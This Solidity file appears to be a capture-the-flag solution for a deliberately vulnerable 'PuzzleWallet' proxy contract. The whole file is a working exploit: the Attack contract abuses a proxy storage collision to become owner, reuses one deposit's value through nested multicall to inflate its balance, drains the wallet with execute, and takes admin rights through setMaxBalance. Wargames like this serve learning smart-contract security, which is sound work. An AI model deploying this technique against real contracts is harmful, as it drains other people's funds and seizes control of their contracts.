// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IPuzzleWallet {
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
    function admin() external returns (address);
}

contract Attack {
    IPuzzleWallet target;

    // 0x8691077E7e91182A35BA67B90D92eE814F845618
    constructor(address targetAddr) {
        target = IPuzzleWallet(targetAddr);
    }

    function attack() public payable {
        target.proposeNewAdmin(address(this));

        target.addToWhitelist(address(this));
    
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(target.deposit.selector);
        bytes[] memory dataCall = new bytes[](2);
        dataCall[0] = depositSelector[0];
        dataCall[1] = abi.encodeWithSelector(target.multicall.selector, depositSelector);

        target.multicall{value: 0.001 ether}(dataCall);
        target.execute(msg.sender, 0.002 ether, "");
        target.setMaxBalance(uint256(uint160(msg.sender)));

        require(target.admin() == msg.sender, "failed");
    }
}
